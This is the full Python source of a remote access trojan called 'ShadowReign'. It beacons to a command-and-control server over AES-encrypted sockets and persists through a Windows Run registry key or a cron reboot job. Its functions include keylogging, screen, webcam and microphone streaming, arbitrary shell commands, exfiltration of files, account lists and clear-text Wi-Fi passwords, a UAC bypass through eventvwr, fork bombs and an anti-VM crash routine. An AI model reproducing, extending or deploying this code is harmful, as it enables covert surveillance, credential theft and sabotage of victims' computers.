import socket
import json
import os
import threading
import subprocess
import platform
import shutil
import pynput.keyboard as kb
import mss
import cv2
import pyaudio
import wave
import pyttsx3
import psutil
import time
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import numpy as np
import random
import string

# Random name generator for persistence
def rand_name(length=10):
    return ''.join(random.choices(string.ascii_letters, k=length))

class ShadowReignPayload:
    def __init__(self):
        self.c2 = ("192.168.1.133", 5251)  # Update to your C2 server IP
        self.KEY = b"ShadowReignBoss!"  # 16-byte encryption key
        self.sock = None
        self.anti_vm_enabled = False  # Off by default
        self.keylogger = None
        self.running = True
        self.command_queue = []
        self.streaming_screen = False
        self.streaming_webcam = False
        self.streaming_mic = False
        self.connect()
        self.persistence()

    def encrypt(self, data):
        try:
            cipher = AES.new(self.KEY, AES.MODE_CBC)
            ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
            iv = base64.b64encode(cipher.iv).decode()
            ct = base64.b64encode(ct_bytes).decode()
            return f"{iv}:{ct}"
        except Exception:
            return None

    def decrypt(self, data):
        try:
            iv, ct = data.split(":")
            iv = base64.b64decode(iv)
            ct = base64.b64decode(ct)
            cipher = AES.new(self.KEY, AES.MODE_CBC, iv=iv)
            return unpad(cipher.decrypt(ct), AES.block_size).decode()
        except Exception:
            return None

    def send_message(self, message):
        encrypted = self.encrypt(message)
        if not encrypted:
            return
        length = len(encrypted)
        length_bytes = length.to_bytes(4, byteorder='big')
        self.sock.send(length_bytes + encrypted.encode())

    def connect(self):
        delay = 5
        while self.running:
            try:
                if self.sock:
                    self.sock.close()
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect(self.c2)
                self.send_info()
                self.listen()
                break
            except Exception:
                time.sleep(delay)
                delay = min(delay * 2, 60)

    def send_info(self):
        try:
            info = {
                "os": platform.system(),
                "hostname": socket.gethostname(),
                "ip": socket.gethostbyname(socket.gethostname()),
                "cpu": psutil.cpu_percent(),
                "ram": psutil.virtual_memory().percent,
                "anti_vm": self.anti_vm_enabled
            }
            self.send_message(json.dumps(info))
        except Exception:
            pass

    def listen(self):
        threading.Thread(target=self._listen, daemon=True).start()

    def _listen(self):
        while self.running:
            try:
                length_bytes = self.sock.recv(4)
                if not length_bytes:
                    self.connect()
                    continue
                length = int.from_bytes(length_bytes, byteorder='big')
                data = self.sock.recv(length).decode()
                cmd = json.loads(self.decrypt(data))
                self.command_queue.append((cmd["command"], cmd.get("data")))
                self.execute_next()
            except Exception:
                self.connect()

    def execute_next(self):
        if not self.command_queue:
            return
        command, data = self.command_queue.pop(0)
        handlers = {
            "keylogger_start": self.keylogger_start,
            "keylogger_stop": self.keylogger_stop,
            "keylogger_dump": self.keylogger_dump,
            "list_files": self.list_files,
            "receive_file": self.receive_file,
            "send_file": self.send_file,
            "screenshot": self.screenshot,
            "record_screen": self.record_screen,
            "webcam_snap": self.webcam_snap,
            "shell": self.shell,
            "dump_hashes": self.dump_hashes,
            "steal_wifi": self.steal_wifi,
            "elevate_privileges": self.elevate_privileges,
            "jumpscare": self.jumpscare,
            "crash_system": self.crash_system,
            "fork_bomb": self.fork_bomb,
            "stream_screen": self.stream_screen,
            "stream_webcam": self.stream_webcam,
            "stream_mic": self.stream_mic,
            "stop_stream": self.stop_stream,
            "toggle_anti_vm": self.toggle_anti_vm
        }
        if command in handlers:
            try:
                handlers[command](data)
            except Exception as e:
                self.send_message(json.dumps({"error": f"{command} failed: {str(e)}"}))

    def persistence(self):
        try:
            if platform.system() == "Windows":
                exe_path = os.path.join(os.getenv("APPDATA"), f"{rand_name()}.py")
                shutil.copy(__file__, exe_path)
                subprocess.Popen(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {rand_name()} /t REG_SZ /d "pythonw {exe_path}" /f', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            elif platform.system() in ["Linux", "Darwin"]:
                cron = f"@reboot python3 {os.path.abspath(__file__)}"
                subprocess.Popen(f'(crontab -l 2>/dev/null; echo "{cron}") | crontab -', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass

    def toggle_anti_vm(self, enable):
        self.anti_vm_enabled = bool(enable)
        self.send_message(json.dumps({"status": f"Anti-VM {'enabled' if self.anti_vm_enabled else 'disabled'}"}))
        if self.anti_vm_enabled:
            self.anti_analysis()

    def anti_analysis(self):
        if not self.anti_vm_enabled:
            return
        try:
            if platform.system() == "Windows" and "VMware" in subprocess.check_output("wmic bios get serialnumber", shell=True).decode():
                self.crash_system(None)
                exit(0)
            elif platform.system() in ["Linux", "Darwin"] and "virtual" in subprocess.check_output("uname -r", shell=True).decode().lower():
                self.fork_bomb(None)
                exit(0)
        except Exception:
            pass

    def keylogger_start(self, _):
        if not self.keylogger:
            self.keylogger = Keylogger(self.sock, self.send_message)
            self.keylogger.start()
            self.send_message(json.dumps({"status": "Keylogger started"}))

    def keylogger_stop(self, _):
        if self.keylogger:
            self.keylogger.stop()
            self.keylogger = None
            self.send_message(json.dumps({"status": "Keylogger stopped"}))

    def keylogger_dump(self, _):
        if self.keylogger:
            self.keylogger.dump()

    def list_files(self, _):
        try:
            files = os.listdir()
            self.send_message(json.dumps({"files": files}))
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def receive_file(self, data):
        try:
            path = data["path"]
            content = base64.b64decode(data["content"])
            with open(path, "wb") as f:
                f.write(content)
            self.send_message(json.dumps({"status": f"File received: {path}"}))
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def send_file(self, path):
        try:
            with open(path, "rb") as f:
                content = base64.b64encode(f.read()).decode()
                self.send_message(json.dumps({"file": content}))
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def screenshot(self, _):
        try:
            with mss.mss() as sct:
                img = sct.grab(sct.monitors[1])
                img_np = np.array(img)
                _, buffer = cv2.imencode(".png", img_np)
                self.send_message(json.dumps({"screenshot": base64.b64encode(buffer).decode()}))
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def record_screen(self, _):
        try:
            sct = mss.mss()
            fourcc = cv2.VideoWriter_fourcc(*"XVID")
            out = cv2.VideoWriter("screen.avi", fourcc, 5.0, (1920, 1080))
            start = time.time()
            while time.time() - start < 10:
                img = sct.grab(sct.monitors[1])
                frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGRA2BGR)
                out.write(frame)
                time.sleep(0.1)
            out.release()
            with open("screen.avi", "rb") as f:
                self.send_message(json.dumps({"video": base64.b64encode(f.read()).decode()}))
            os.remove("screen.avi")
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def webcam_snap(self, _):
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                _, buffer = cv2.imencode(".jpg", frame)
                self.send_message(json.dumps({"webcam": base64.b64encode(buffer).decode()}))
            else:
                self.send_message(json.dumps({"error": "No webcam available"}))
            cap.release()
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def shell(self, cmd):
        try:
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
            self.send_message(json.dumps({"output": output}))
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def dump_hashes(self, _):
        try:
            if platform.system() == "Windows":
                output = subprocess.check_output("wmic useraccount get name,sid", shell=True).decode()
            else:
                output = subprocess.check_output("cat /etc/passwd", shell=True).decode()
            self.send_message(json.dumps({"hashes": base64.b64encode(output.encode()).decode()}))
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def steal_wifi(self, _):
        try:
            if platform.system() == "Windows":
                output = subprocess.check_output("netsh wlan show profiles", shell=True).decode()
                profiles = [line.split(":")[1].strip() for line in output.splitlines() if "All User Profile" in line]
                wifi_data = {}
                for profile in profiles:
                    details = subprocess.check_output(f"netsh wlan show profile name=\"{profile}\" key=clear", shell=True).decode()
                    wifi_data[profile] = details
                self.send_message(json.dumps(wifi_data))
            else:
                self.send_message(json.dumps({"error": "WiFi stealing not supported on this OS"}))
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def elevate_privileges(self, _):
        try:
            if platform.system() == "Windows":
                subprocess.Popen(f'reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /ve /d "pythonw {__file__}" /f', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.Popen('eventvwr.exe', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self.send_message(json.dumps({"status": "Privilege elevation attempted"}))
            else:
                self.send_message(json.dumps({"error": "Privilege elevation not supported on this OS"}))
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def jumpscare(self, _):
        try:
            engine = pyttsx3.init()
            engine.say("You’ve been owned by ShadowReign!")
            engine.runAndWait()
            self.send_message(json.dumps({"status": "Jumpscare executed"}))
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def crash_system(self, _):
        try:
            if platform.system() == "Windows":
                while True:
                    threading.Thread(target=lambda: None).start()
            else:
                subprocess.Popen(":(){ :|: & };:", shell=True)
            self.send_message(json.dumps({"status": "System crash initiated"}))
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def fork_bomb(self, _):
        try:
            if platform.system() == "Windows":
                subprocess.Popen("cmd /c :a & start cmd /c %0 & goto a", shell=True)
            else:
                subprocess.Popen(":(){ :|: & };:", shell=True)
            self.send_message(json.dumps({"status": "Fork bomb launched"}))
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def stream_screen(self, _):
        self.streaming_screen = True
        try:
            sct = mss.mss()
            while self.streaming_screen:
                img = sct.grab(sct.monitors[1])
                frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGRA2BGR)
                _, buffer = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
                self.send_message(json.dumps({"stream_frame": base64.b64encode(buffer).decode()}))
                time.sleep(0.1)
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def stream_webcam(self, _):
        self.streaming_webcam = True
        try:
            cap = cv2.VideoCapture(0)
            while self.streaming_webcam:
                ret, frame = cap.read()
                if ret:
                    _, buffer = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
                    self.send_message(json.dumps({"webcam_frame": base64.b64encode(buffer).decode()}))
                time.sleep(0.1)
            cap.release()
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def stream_mic(self, _):
        self.streaming_mic = True
        try:
            p = pyaudio.PyAudio()
            stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
            while self.streaming_mic:
                audio_data = stream.read(1024)
                self.send_message(json.dumps({"mic_chunk": base64.b64encode(audio_data).decode()}))
                time.sleep(0.01)
            stream.stop_stream()
            stream.close()
            p.terminate()
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def stop_stream(self, _):
        self.streaming_screen = False
        self.streaming_webcam = False
        self.streaming_mic = False
        self.send_message(json.dumps({"status": "Streams stopped"}))

class Keylogger:
    def __init__(self, sock, send_message):
        self.sock = sock
        self.send_message = send_message
        self.logs = ""
        self.active = False

    def on_press(self, key):
        if self.active:
            self.logs += str(key) + " "

    def start(self):
        self.active = True
        self.listener = kb.Listener(on_press=self.on_press)
        self.listener.start()

    def stop(self):
        self.active = False
        self.listener.stop()

    def dump(self):
        self.send_message(json.dumps({"keylogs": self.logs}))
        self.logs = ""

if __name__ == "__main__":
    payload = ShadowReignPayload()
    payload.anti_analysis()
    while payload.running:
        time.sleep(1)  # Keep main thread alive
